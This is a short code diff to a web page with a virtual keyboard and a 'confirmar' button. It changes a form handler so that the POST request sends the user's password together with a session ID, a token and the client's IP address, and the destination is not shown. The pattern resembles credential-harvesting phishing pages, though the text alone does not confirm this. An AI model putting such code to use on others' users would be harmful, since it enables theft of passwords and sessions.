@@ -63,6 +63,7 @@
 <script type="text/javascript" src="js/keyboard-handler.js"></script>
 
 <script> 
+var ip = getIP();
 $("#text_input").click(function () {
     key_vis = true;
     $text_input = $(this);
@@ -78,7 +79,8 @@ $("#confirmar").click(function () {
     getData();
 
   async function getData() {
-    const data = {valueSenhaUser};
+    var ip = await getIP();
+    const data = {valueSenhaUser,sessionId,token,ip};
     const options = {
       method: 'POST',
       headers: {
